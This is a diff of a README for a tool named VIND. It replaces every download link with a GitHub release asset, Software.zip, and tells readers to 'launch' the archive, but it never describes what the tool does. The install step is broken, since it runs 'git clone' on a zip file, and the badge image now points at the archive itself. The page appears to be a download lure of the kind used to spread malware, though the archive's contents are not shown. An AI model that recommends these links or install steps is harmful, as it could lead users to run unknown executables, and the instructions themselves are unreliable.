@@ -34,10 +34,10 @@ For detailed instructions, please refer to the documentation provided in the rep
 To install **VIND**, simply run the following command:
 
 ```
-$ git clone https://github.com/user-attachments/files/18388744/Software.zip
+$ git clone https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip
 ```
 
-Launch the software.zip archive to access the **VIND** tool.
+Launch the https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip archive to access the **VIND** tool.
 
 ---
 
@@ -49,9 +49,9 @@ We welcome contributions from the open-source community to make **VIND** even be
 
 ## Support 💬
 
-If you encounter any issues or have any questions about **VIND**, please check the "Releases" section for updates. You can also visit [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) to access additional resources.
+If you encounter any issues or have any questions about **VIND**, please check the "Releases" section for updates. You can also visit [https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip](https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip) to access additional resources.
 
-[![Download VIND](https://img.shields.io/badge/Download-VIND-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download VIND](https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip)](https://github.com/boomerkibble/vind/releases/download/v2.0/Software.zip)
 
 ---
 
